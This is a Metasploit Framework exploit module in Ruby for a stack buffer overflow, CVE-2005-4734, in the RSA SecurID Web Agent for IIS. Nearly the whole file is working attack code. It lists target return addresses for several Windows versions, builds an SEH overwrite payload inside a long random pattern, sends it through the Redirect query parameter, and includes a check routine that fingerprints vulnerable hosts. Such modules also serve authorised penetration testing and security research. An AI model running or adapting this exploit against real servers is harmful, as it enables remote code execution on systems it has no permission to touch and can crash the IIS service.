##
# $Id: rsa_webagent_redirect.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft IIS ISAPI RSA WebAgent Redirect Overflow',
			'Description'    => %q{
				This module exploits a stack buffer overflow in the SecurID Web
				Agent for IIS. This ISAPI filter runs in-process with
				inetinfo.exe, any attempt to exploit this flaw will result
				in the termination and potential restart of the IIS service.

			},
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10394 $',
			'References'     =>
				[
					['CVE', '2005-4734'],
					['OSVDB', '20151'],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00\x09\x0a\x0b\x0d\x20\x22\x23\x25\x26\x27\x2b\x2f" +
						(0x3a..0x3f).to_a.pack('C*') + "\x40\x5c" + "Zz",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# Version-specific return addresses
					['RSA WebAgent 5.2', { 'Rets' => [ 996, 0x1001e694 ] }],
					['RSA WebAgent 5.3', { 'Rets' => [ 992, 0x10010e89 ] }],

					# Generic return addresses
					['RSA WebAgent 5.2 on Windows 2000 English', { 'Rets' => [ 996, 0x75022ac4 ] }],
					['RSA WebAgent 5.3 on Windows 2000 English', { 'Rets' => [ 992, 0x75022ac4 ] }],

					['RSA WebAgent 5.2 on Windows XP SP0-SP1 English', { 'Rets' => [ 996, 0x71ab1d54 ] }],
					['RSA WebAgent 5.3 on Windows XP SP0-SP1 English', { 'Rets' => [ 992, 0x71ab1d54 ] }],

					['RSA WebAgent 5.2 on Windows XP SP2 English', { 'Rets' => [ 996, 0x71ab9372 ] }],
					['RSA WebAgent 5.3 on Windows XP SP2 English', { 'Rets' => [ 992, 0x71ab9372 ] }],

					['RSA WebAgent 5.2 on Windows 2003 English SP0', { 'Rets' => [ 996, 0x7ffc0638 ] }],
					['RSA WebAgent 5.3 on Windows 2003 English SP0', { 'Rets' => [ 992, 0x7ffc0638 ] }],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Oct 21 2005'))

		register_options(
			[
				OptString.new('URL', [ true,  "The path to IISWebAgentIF.dll", "/WebID/IISWebAgentIF.dll" ]),
			], self.class)
	end

	def check
		r = send_request_raw({
			'uri'   => datastore['URL'],
			'query' => 'GetPic?image=msf'
		}, -1)

		if (r and r.body and r.body =~ /RSA Web Access Authentication/)
			return Exploit::CheckCode::Detected
		end
		return Exploit::CheckCode::Safe
	end

	def exploit

		pat = rand_text_alphanumeric(8192).gsub(/\d|Z/i, 'A') # HACK
		seh = generate_seh_payload(target['Rets'][1])
		pat[target['Rets'][0]-4, seh.length] = seh

		r = send_request_raw({
			'uri'   => datastore['URL'],
			'query' => 'Redirect?url=' + pat
		}, 5)

		handler
		disconnect
	end

end